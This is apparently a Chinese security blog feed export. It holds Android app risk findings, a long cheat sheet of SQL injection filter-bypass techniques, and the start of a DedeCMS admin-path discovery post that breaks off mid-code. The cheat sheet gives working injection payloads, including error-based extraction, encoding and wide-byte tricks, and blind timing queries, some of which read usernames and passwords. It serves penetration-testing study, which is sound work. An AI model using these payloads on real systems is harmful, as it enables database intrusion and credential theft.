font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>泄露的js文件如果被读取，可能会造成功能逻辑泄露，如果被篡改，可能被植入钓鱼页面或恶意代码，造成用户的敏感信息泄露<br><strong>加固建议：</strong><br>对资源文件(.js)进行加密保护，防止资源文件泄露。</p><h2 id="Webview明文存储密码风险"><a href="#Webview明文存储密码风险" class="headerlink" title="Webview明文存储密码风险"></a>Webview明文存储密码风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>在使用WebView的过程中忽略了WebView setSavePassword，当用户选择保存在WebView中输入的用户名和密码，则会被明文保存到应用数据目录的databases/webview.db中。如果手机被root就可以获取明文保存的密码，造成用户的个人敏感数据泄露。<br><strong>加固建议：</strong><br>使用WebView.getSettings().setSavePassword(false)来禁止保存密码</p><h2 id="明文数字证书风险"><a href="#明文数字证书风险" class="headerlink" title="明文数字证书风险"></a>明文数字证书风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>明文存储的数字证书如果被篡改，可能会造成客户端与服务端之间的传输数据被截获并解密，造成用户信息泄露<br><strong>加固建议：</strong><br>对数字证书文件(.cer)进行加密，避免证书文件泄露</p><h2 id="应用数据任意备份风险"><a href="#应用数据任意备份风险" class="headerlink" title="应用数据任意备份风险"></a>应用数据任意备份风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Android 2.1 以上的系统可为App提供应用程序数据的备份和恢复功能，该由AndroidMainfest.xml文件中的allowBackup 属性值控制，其默认值为true。当该属性没有显式设置为false时,攻击者可通过adb backup 和adb restore对App的应用数据进行备份和恢复,从而可能获取明文存储的用户敏感信息，如用户的密码、证件号、手机号、交易密码、身份令牌、服务器通信记录等。利用此类信息攻击者可伪造用户身份，盗取用户账户资产，或者直接对服务器发起攻击。<br><strong>加固建议：</strong><br>关闭应用程序数据的备份和恢复功能。</p><h2 id="AES-DES加密方法不安全使用漏洞"><a href="#AES-DES加密方法不安全使用漏洞" class="headerlink" title="AES/DES加密方法不安全使用漏洞"></a>AES/DES加密方法不安全使用漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>使用AES/DES/DESede加密算法时，如果使用ECB模式，容易受到攻击风险，造成信息泄露<br><strong>加固建议：</strong><br>使用AES/DES/DESede加密算法时，应显示指定使用CBC或CFB加密模式</p><h2 id="敏感函数调用风险"><a href="#敏感函数调用风险" class="headerlink" title="敏感函数调用风险"></a>敏感函数调用风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>APP应用程序中调用了包含敏感行为的函数，包括发送短信、发送地理位置、拨打电话等，可能会导致用户隐私数据泄露等风险<br><strong>加固建议：</strong><br>开发者审核包含敏感行为的函数调用，确保其使用是必要且限制于授权用户的</p><h2 id="HTTP传输数据风险"><a href="#HTTP传输数据风险" class="headerlink" title="HTTP传输数据风险"></a>HTTP传输数据风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>攻击者在自己设置的钓鱼网络中配置DNS服务器，将软件要连接的服务器域名解析至攻击者的另一台服务器在，这台服务器就可以获得用户登录信息，或者充当客户端与原服务器的中间人，转发双方数据。<br><strong>加固建议：</strong><br>对敏感数据采用基于SSL/TLS的HTTPS进行传输。</p><h2 id="HTTPS未校验服务器证书漏洞"><a href="#HTTPS未校验服务器证书漏洞" class="headerlink" title="HTTPS未校验服务器证书漏洞"></a>HTTPS未校验服务器证书漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>虽然使用了https通信方式，但是只是简单的调用而已，并未对SSL证书有效性做验证，攻击者以轻易获取手机用户的明文通信信息。<br><strong>加固建议：</strong><br>对SSL证书进行有效性做验证</p><h2 id="Activity组件导出风险"><a href="#Activity组件导出风险" class="headerlink" title="Activity组件导出风险"></a>Activity组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Activity组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到绕过认证、恶意代码注入等攻击风险。<br><strong>加固建议：</strong><br>如果应用的Activity组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要提供给外部应用使用，建议对组件进行权限控制。</p><h2 id="Service组件导出风险"><a href="#Service组件导出风险" class="headerlink" title="Service组件导出风险"></a>Service组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Service组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到权限提升、拒绝服务等攻击风险。<br><strong>加固建议：</strong><br>如果应用的Service组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要提供给外部应用使用，建议对组件进行权限控制。</p><h2 id="Broadcast-Receiver组件导出风险"><a href="#Broadcast-Receiver组件导出风险" class="headerlink" title="Broadcast Receiver组件导出风险"></a>Broadcast Receiver组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Broadcast Receiver组件可以被第三方APP任意调用，导致敏感信息泄露，并可能受到权限绕过、拒绝服务等攻击风险<br><strong>加固建议：</strong><br>如果应用的Broadcast Receiver组件不必要导出，或者组件配置了intent filter标签，建议显示设置组件的“android:exported”属性为false；如果组件必须要接收外部应用发送的消息，建议对组件进行权限控制。</p><h2 id="系统组件本地拒绝服务检测"><a href="#系统组件本地拒绝服务检测" class="headerlink" title="系统组件本地拒绝服务检测"></a>系统组件本地拒绝服务检测</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的组件在处理Intent附加数据的时候，没有进行异常捕获，攻击者可通过向应用发送空数据、异常或畸形数据等，导致应用程序崩溃。<br><strong>加固建议：</strong><br>不必要导出的组件，建议显示设置组件的“android:exported”属性为false；在使用Intent获取附加数据时，使用try catch进行异常捕获和处理，防止抛出异常引发崩溃。</p><h2 id="Content-Provider组件导出风险"><a href="#Content-Provider组件导出风险" class="headerlink" title="Content Provider组件导出风险"></a>Content Provider组件导出风险</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>导出的Content Provider组件可以被第三方app任意调用，导致敏感信息泄露，并可能受到目录遍历、SQL注入等攻击风险<br><strong>加固建议：</strong><br>如果应用的Content Provider组件不必要导出，建议显式设置组件的“android:exported”属性为false；如果必须要有数据提供给外部应用使用，建议对组件进行权限控制。</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞描述</tag>
      
      <tag>解决建议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入常见技巧汇总</title>
    <link href="/p/a571637f.html"/>
    <url>/p/a571637f.html</url>
    
    <content type="html"><![CDATA[<h2 id="into绕过order-by-过滤"><a href="#into绕过order-by-过滤" class="headerlink" title="into绕过order by 过滤"></a>into绕过order by 过滤</h2><p><code>order by</code> 和 <code>into</code>两个都可以用来判断列数，但是两者是有区别的<br><code>order by </code>是你<code>select</code>了几个就可以在那几个的范围里面变动，超过就报错。</p><pre><code class="hljs mysql">mysql&gt; select username,password from users order by 1;+----------+------------+| username | password   |+----------+------------+| admin    | admin      || admin1   | admin1     || admin2   | admin2     || admin3   | admin3     || admin4   | admin4     || Angelina | I-kill-you || batman   | mob!le     || dhakkan  | dumbo      || Dumb     | Dumb       || Dummy    | p@ssword   || hello    | world      || secure   | crappy     || stupid   | stupidity  || superman | genious    |+----------+------------+14 rows in set (0.01 sec)mysql&gt; select username,password from users order by 2;+----------+------------+| username | password   |+----------+------------+| admin    | admin      || admin1   | admin1     || admin2   | admin2     || admin3   | admin3     || admin4   | admin4     || secure   | crappy     || Dumb     | Dumb       || dhakkan  | dumbo      || superman | genious    || Angelina | I-kill-you || batman   | mob!le     || Dummy    | p@ssword   || stupid   | stupidity  || hello    | world      |+----------+------------+14 rows in set (0.00 sec)mysql&gt; select username,password from users order by 3;ERROR 1054 (42S22): Unknown column &#39;3&#39; in &#39;order clause&#39;</code></pre><p><code>into</code> 就比较死板，必须是你<code>select</code> 了几个就要<code>into</code> 几个，少了多了都不行。而且必须是一行才可以所以必须要limit.（1.select into 本是一个备份内容的操作。2.@是一个变量符号）</p><pre><code class="hljs mysql">mysql&gt; select username,password from users into @;ERROR 1222 (21000): The used SELECT statements have a different number of columnsmysql&gt; select username,password from users into @,@;ERROR 3061 (42000): User variable name &#39;&#39; is illegalmysql&gt; select username,password from users into @,@,@;ERROR 1222 (21000): The used SELECT statements have a different number of columns</code></pre><blockquote><p>order by 只能在 limit前使用,into 只能在limit 之后使用</p></blockquote><pre><code class="hljs mysql">mysql&gt; select * from users limit 1,1 order by 3;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;order by 3&#39; at line 1mysql&gt; select * from users order by 3 limit 1,1;+----+----------+----------+| id | username | password |+----+----------+----------+|  9 | admin1   | admin1   |+----+----------+----------+1 row in set (0.00 sec)</code></pre><pre><code class="hljs mysql">mysql&gt; select * from users limit 1,1 into @,@,@;ERROR 3061 (42000): User variable name &#39;&#39; is illegalmysql&gt; select * from users into @,@,@ limit 1,1;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;limit 1,1&#39; at line 1</code></pre><p>小结：<code>order by</code> 过滤了用<code>into</code></p><h2 id="16进制绕过引号"><a href="#16进制绕过引号" class="headerlink" title="16进制绕过引号"></a>16进制绕过引号</h2><p>有些时候过滤了引号，导致字符串不能写入，我们可以用字符串的16进制形式绕过，这样就不需要引号了。还有<code>hex()</code>和<code>unhex()</code>这两个函数可以使用。</p><pre><code class="hljs mysql">select column_name from information_schema.columns where table_name&#x3D;&quot;users&quot;select column_name from information_schema.tables where table_name&#x3D;0x7573657273</code></pre><h2 id="等于号过滤使用like-或者-in-绕过"><a href="#等于号过滤使用like-或者-in-绕过" class="headerlink" title="等于号过滤使用like 或者 in 绕过"></a>等于号过滤使用like 或者 in 绕过</h2><p>等号过滤用<code>in</code>或<code>like </code>代替</p><pre><code class="hljs mysql">substr(password,1,1) in(&#39;p&#39;);substr(password,1,1) like(&#39;p&#39;);mysql&gt; select * from users where username in(&#39;admin&#39;);+----+----------+----------+| id | username | password |+----+----------+----------+|  8 | admin    | admin    |+----+----------+----------+1 row in set (0.00 sec)</code></pre><p><code>in</code> 还能通过<code>order by</code> 指定顺序</p><pre><code class="hljs mysql">select * from users where id IN (3,6,9,1,2,5,8,7) order by field(id,3,6,9,1,2,5,8,7);</code></pre><h2 id="lt-，-gt-代替等于号构造真值"><a href="#lt-，-gt-代替等于号构造真值" class="headerlink" title="&lt;，&gt; 代替等于号构造真值"></a>&lt;，&gt; 代替等于号构造真值</h2><pre><code class="hljs mysql">or swords &gt; swor swords &lt; twor 1&lt;3</code></pre><h2 id="字符串相等绕过"><a href="#字符串相等绕过" class="headerlink" title="字符串相等绕过"></a>字符串相等绕过</h2><pre><code class="hljs mysql">or &#39;swords&#39; &#x3D; &#39;swords&#39;</code></pre><h2 id="sleep过滤"><a href="#sleep过滤" class="headerlink" title="sleep过滤"></a>sleep过滤</h2><p><code>BENCHMARK(count,expr)</code></p><p><code>BENCHMARK()</code>函数重复<code>countTimes</code>次执行表达式<code>expr</code>,执行的时间长了，也达到了sleep的作用。</p><pre><code class="hljs mysql">if(ascii(substring((database()),1,1))&gt;1,(select benchmark(10000000,md5(0x41))),1)</code></pre><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p><code>URLEncode编码</code>，<code>ASCII</code>，<code>HEX</code>，<code>unicode编码</code>绕过</p><blockquote><p>URL编码：<code>or 1=1</code>即<code>%6f%72%20%31%3d%31</code></p></blockquote><blockquote><p>url双重编码; <code>?id=1%252f%252a\*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a\*/FROM%252f%252a\*/Users--+</code></p></blockquote><blockquote><p>hex编码：见16进制绕过单引号</p></blockquote><blockquote><p>ascii编码: <code>select * from users where username=char(97,100,109,105,110)</code></p></blockquote><p>或者</p><p><code>char(101)+char(97)+char(105)+char(116)</code></p><blockquote><p>unicode编码：</p></blockquote><p>一些unicode编码举例：</p><pre><code class="hljs unicode">单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</code></pre><blockquote><p>html 实体编码：SELECT FROM Users WHERE username = &#39;admin&#39;</p></blockquote><h2 id="substr-的逗号绕过"><a href="#substr-的逗号绕过" class="headerlink" title="substr()的逗号绕过"></a>substr()的逗号绕过</h2><p><code>from 1 for 1</code> 代替 <code>substr(,1,1)</code></p><pre><code class="hljs mysql">select * from users where id&#x3D;1 union select 1,2, substr((select username from users limit 0,1),1,1);select * from users where id&#x3D;1 union select 1,2, substr((select username from users limit 0,1) from 1 for 1);</code></pre><pre><code class="hljs mysql">mysql&gt; select * from users where id&#x3D;1 union select 1,2, substr((select username from users limit 0,1),1,1);+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | Dumb     | Dumb     ||  1 | 2        | D        |+----+----------+----------+2 rows in set (0.01 sec)mysql&gt; select * from users where id&#x3D;1 union select 1,2, substr((select username from users limit 0,1) from 1 for 1);+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | Dumb     | Dumb     ||  1 | 2        | D        |+----+----------+----------+2 rows in set (0.00 sec)</code></pre><h2 id="limit-逗号绕过"><a href="#limit-逗号绕过" class="headerlink" title="limit 逗号绕过"></a>limit 逗号绕过</h2><p><code>limit 1 offset 0</code> 代替 <code>limit 0,1</code></p><pre><code class="hljs mysql">select * from users where id&#x3D;1 union select 1,2, substr((select username from users limit 1 offset 0),1,1);</code></pre><h2 id="其他逗号绕过（使用join"><a href="#其他逗号绕过（使用join" class="headerlink" title="其他逗号绕过（使用join)"></a>其他逗号绕过（使用join)</h2><pre><code class="hljs mysql">select * from users union select 1,2,3;select * from users union select * from (select 1)a join (select 2)b join (select 3)c;</code></pre><h2 id="greatest-between-绕过-lt-gt-等比较符号"><a href="#greatest-between-绕过-lt-gt-等比较符号" class="headerlink" title="greatest between 绕过&lt;,&gt; 等比较符号"></a>greatest between 绕过&lt;,&gt; 等比较符号</h2><p>当我们盲注的时候，要用到比较符号，如果过滤了可以用<code>greatest(x,y,z,..)</code>绕过 返回的是他们的最大值</p><pre><code class="hljs mysql">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</code></pre><p>改成</p><pre><code class="hljs mysql">select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</code></pre><p>当然这里的等于号可以改成<code>in()</code></p><pre><code class="hljs mysql">SELECT * FROM &#96;p_archives_3&#96; WHERE &#96;picsad&#96; between 1113 and 1122</code></pre><p>等同于</p><pre><code class="hljs mysql">SELECT * FROM &#96;p_archives_3&#96; WHERE &#96;picsad&#96; &gt;&#x3D; 1113 and &#96;picsad&#96;&lt;&#x3D;1122</code></pre><p>你要保证<code>picsad</code>是<code>数字类型</code>的</p><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><blockquote><p>()</p></blockquote><p>括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格<br><code>select(user())from dual where(1=1)and(2=2)</code><br><code>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</code></p><blockquote><p>/**/或者/*1*/</p></blockquote><blockquote><p>%0d %0a %0c %0b %a0</p></blockquote><blockquote><p>+</p></blockquote><blockquote><p>TAB</p></blockquote><blockquote><p>两个括号</p></blockquote><blockquote><p>把上面说的编一下码试试</p></blockquote><blockquote><p>select Afrom B 默认from后面必须是空格再加表名，因此为了不让你使用from可能正则表达式会检测后面的空格，我们可以用科学计数法绕过，因为1e0后面可以没有空格</p></blockquote><p><code>select A,1E0fromB</code></p><p>这里的逗号是两列的意思 1e0占了第二列</p><p>同样，上面的1E0可以用1.0代替</p><blockquote><p><code>\N</code> 绕过是绕过<code>NULL</code>,因为<code>\N</code>相当于<code>NULL</code></p></blockquote><pre><code class="hljs mysql">select * from pass where id&#x3D;\Nunion select 1,2, greatest((substr((select username from users limit 1 offset 0),1,1)),&#39;v&#39;)in(&#39;v&#39;);</code></pre><blockquote><p><code>id</code> 与<code>from</code>在之间的空格绕过</p></blockquote><pre><code class="hljs mysql">select+id-1+1.from users;select-id-1+3.from users;</code></pre><p>注意：第二句得到的id将会是 -id+2</p><h2 id="常见的注释"><a href="#常见的注释" class="headerlink" title="常见的注释"></a>常见的注释</h2><blockquote><p>–+</p></blockquote><blockquote><p>#</p></blockquote><blockquote><p>%23</p></blockquote><blockquote><p>– -</p></blockquote><blockquote><p>%00</p></blockquote><blockquote><p>`单行或者多行注释（别名）</p></blockquote><blockquote><p>/* */ 单行或者多行注释</p></blockquote><h2 id="利用过滤删除绕过"><a href="#利用过滤删除绕过" class="headerlink" title="利用过滤删除绕过"></a>利用过滤删除绕过</h2><p>比如说他过滤了<code>/**/</code>（将其删除）又过滤了<code>select</code>那么我们可以这么写<br><code>sel/**/ect</code>.</p><p>意思就是被删除的可以加在另一个要删除的里面，这样不仅不会识别，删除后又还原了，实现绕过，这里面还包括双写被过滤字符的方法</p><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>经常试试大小写混合比如 <code>UnIOn sELecT</code>….</p><h2 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h2><p>介绍一下什么是内联注释：/<em>!</em>/在其他数据库语言中是注释，但是在sql中却可以执行，为了sql提高语句的兼容性.</p><pre><code class="hljs mysql">id&#x3D;1&#x2F;*!UnIoN*&#x2F;+SeLeCT+1,2,concat(&#x2F;*!table_name*&#x2F;)+FrOM &#x2F;*information_schema*&#x2F;.tables &#x2F;*!WHERE *&#x2F;+&#x2F;*!TaBlE_ScHeMa*&#x2F;+like+database()-- -&#x2F;*!50001from*&#x2F; 表示在mysql版本高于50001也就是mysql5中可以执行这条命令</code></pre><h2 id="拆分字符串绕过"><a href="#拆分字符串绕过" class="headerlink" title="+ - . 拆分字符串绕过"></a>+ - . 拆分字符串绕过</h2><pre><code class="hljs mysql">?id&#x3D;1&#39; or &#39;11+11&#39;&#x3D;&#39;11+11&#39;&quot;-&quot;和&quot;.&quot;</code></pre><h2 id="符号代替文字绕过"><a href="#符号代替文字绕过" class="headerlink" title="符号代替文字绕过"></a>符号代替文字绕过</h2><blockquote><p>&amp;&amp;代替and</p></blockquote><blockquote><p>||代替or</p></blockquote><blockquote><p>| 代替 xor</p></blockquote><h2 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h2><p>简单的讲一下，一般当引号被过滤就会在引号前加一个<code>\</code>，将其转义失去作用，这样我们就不能闭合引号完成注入了。但是如果他的字符集设置为了双字节，也就是说两个字符可以代表一个中文的情况，那么我们就可以构造成一个中文字，<code>\</code>的url是<code>%27</code>我们在引号前写上<code>%df</code>，那么<code>%df%27</code>构成了中文的繁体运,引号就没有被过滤，成功绕过。当然不只是<code>%df</code>只要在那个字符集的范围内都可以。如<code>%bf%27</code> <code>%df%27</code> <code>%aa%27</code></p><h2 id="等价函数变量的绕过"><a href="#等价函数变量的绕过" class="headerlink" title="等价函数变量的绕过"></a>等价函数变量的绕过</h2><blockquote><p>hex()、bin() ==&gt; ascii()</p></blockquote><blockquote><p>sleep() ==&gt;benchmark()</p></blockquote><p>这里补充一下:</p><pre><code class="hljs mipsasm">在sqlsever 中用 <span class="hljs-keyword">waitfor </span>delay在<span class="hljs-keyword">Oracle </span>中用 DBMS_PIPE.RECEIVE_MESSAGE()函数和CASEWHEN„THEN„语句</code></pre><blockquote><p>concat_ws()==&gt;group_concat()</p></blockquote><blockquote><p>mid()、substr() ==&gt; substring()</p></blockquote><blockquote><p>@@user ==&gt; user()</p></blockquote><blockquote><p>@@datadir ==&gt; datadir()</p></blockquote><blockquote><p>@@version ==&gt; version()</p></blockquote><h2 id="数字的其他写法绕过空格"><a href="#数字的其他写法绕过空格" class="headerlink" title="数字的其他写法绕过空格"></a>数字的其他写法绕过空格</h2><pre><code class="hljs mysql">select * from users where id&#x3D;8E0union select 1,2,3,4,5,6,7,8,9,0select * from users where id&#x3D;8.0union select 1,2,3,4,5,6,7,8,9,0</code></pre><p>注：E0是科学计数法</p><h2 id="conv-10-36-代替字母"><a href="#conv-10-36-代替字母" class="headerlink" title="conv(,10,36)代替字母"></a>conv(,10,36)代替字母</h2><p>conv(10,10,36)是大写的A<br>lower(conv(10,10,36/16s))小写的a</p><h2 id="常见的bypass"><a href="#常见的bypass" class="headerlink" title="常见的bypass"></a>常见的bypass</h2><blockquote><p>id=1+(UnIoN)+(SelECT)+</p></blockquote><blockquote><p>id=1+(UnIoN+SeLeCT)+</p></blockquote><blockquote><p>id=1+(UnI)(oN)+(SeL)(EcT)</p></blockquote><blockquote><p>id=1+’UnI’’On’+’SeL’’ECT’ &lt;-MySQL only</p></blockquote><blockquote><p>id=1+’UnI’||’on’+SeLeCT’ &lt;-MSSQL only</p></blockquote><h2 id="使用count-返回数据行数"><a href="#使用count-返回数据行数" class="headerlink" title="使用count(*) 返回数据行数"></a>使用count(*) 返回数据行数</h2><pre><code class="hljs mysql">select count(*) from users;+----------+| count(*) |+----------+|       13 |+----------+</code></pre><p>注意： 这里的行数只是真正的行数，不是最终的id 编号</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><strong>1.extractvalue 报错</strong></p><pre><code class="hljs mysql">and extractvalue(1, concat(1, (select database() limit 0,1)))--+;</code></pre><p>查表<br><code>and extractvalue(1, concat(1,(select table_name from information_schema.tables limit 0,1)))–+;</code><br>查列<br><code>and extractvalue(1, concat(1,(select column_name from information_schema.columns limit 0,1)))–+;</code><br>查数据<br><code>and extractvalue(1, concat(1,(select password from users limit 0,1)))–+;</code></p><p><strong>2.UpdateXml报错</strong></p><p>测试语句</p><pre><code class="hljs sql">and 1=(updatexml(1,concat(0x3a,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())),<span class="hljs-number">1</span>))</code></pre><p>实际测试过程</p><pre><code class="hljs sql">mysql&gt; select * from article where id = 1 and 1=(updatexml(0x3a,concat(1,(select user())),1))ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</code></pre><p><strong>3.运算数值的大小限制报错</strong></p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">exp</span>(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a))；<span class="hljs-keyword">ERROR</span> <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;exp(~((select &#x27;</span>root@localhost<span class="hljs-string">&#x27; from dual)))&#x27;</span></code></pre><p>这个函数是计算e的n次方，~是按位取补，exp计算的次方数是有限制的，我们如果给他传一个字符串，php 的弱类型就会当成是0这样取反之后就超了，报错</p><p>类似的还有：</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span>;</code></pre><p>这里注意一下：</p><p>进行嵌套查询的时候子查询出来的的结果是作为一个派生表来进行上一级的查询的，所以子查询的结果必须要有一个别名，一般是as+别名 但是as 可以省略。</p><p><strong>4.floor()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p><strong>5.geometrycollection()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</code></pre><p><strong>6.multipoint()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</code></pre><p><strong>7.polygon()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</code></pre><p><strong>8.linestring()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</code></pre><p><strong>9.multilinestring()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</code></pre><p><strong>10.multipolygon()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</code></pre><h2 id="限制与from的组合"><a href="#限制与from的组合" class="headerlink" title="限制与from的组合"></a>限制与from的组合</h2><p>用 <code>from.</code> 代替 <code>from</code></p><h2 id="如果遇到表名或者字段名是保留字"><a href="#如果遇到表名或者字段名是保留字" class="headerlink" title="如果遇到表名或者字段名是保留字"></a>如果遇到表名或者字段名是保留字</h2><p>这个时候最好使用点号连接表名和字段名，或者直接使用反引号包起来</p><h2 id="在函数名与括号间添加空格或者注释绕过函数过滤"><a href="#在函数名与括号间添加空格或者注释绕过函数过滤" class="headerlink" title="在函数名与括号间添加空格或者注释绕过函数过滤"></a>在函数名与括号间添加空格或者注释绕过函数过滤</h2><p><code>concat/**/()</code></p><h2 id="在查询时使用一个不存在的函数就能报错出数据库的名字"><a href="#在查询时使用一个不存在的函数就能报错出数据库的名字" class="headerlink" title="在查询时使用一个不存在的函数就能报错出数据库的名字"></a>在查询时使用一个不存在的函数就能报错出数据库的名字</h2><p><code>select password from contents where id=a()</code><br>这个a()是不存在的函数，结果如下</p><pre><code class="hljs mysql">mysql&gt; select username from users where id&#x3D;a();ERROR 1305 (42000): FUNCTION security.a does not exist</code></pre>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决DEDECMS历史难题--找后台目录</title>
    <link href="/p/40eeea0e.html"/>
    <url>/p/40eeea0e.html</url>
    
    <content type="html"><![CDATA[<h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><ul><li>  仅针对windows系统</li></ul><h3 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h3><p>首先看核心文件common.inc.php 大概148行左右</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>)&#123;    <span class="hljs-keyword">require_once</span>(DEDEINC.<span class="hljs-string">&#x27;/uploadsafe.inc.php&#x27;</span>);&#125;</code></pre><a id="more"></a><p>uploadsafe.inc.php</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>( preg_match(<span class="hljs-string">&#x27;#^(cfg_|GLOBALS)#&#x27;</span>, <span class="hljs-variable">$_key</span>) )&#123;    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Request var not allow for uploadsafe!&#x27;</span>);&#125;<span class="hljs-variable">$$_key</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]; <span class="hljs-comment">//获取temp_name </span>$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;name&#x27;</span>];$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_type&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;type&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;#[^0-9a-z\./]#i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;type&#x27;</span>]);$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;size&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;#[^0-9]#&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;size&#x27;</span>]);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;) &amp;&amp; (preg_match(<span class="hljs-string">&quot;#\.(&quot;</span>.<span class="hljs-variable">$cfg_not_allowall</span>.<span class="hljs-string">&quot;)$#i&quot;</span>,$&#123;<span class="hljs-variable">$_key</span>.<span 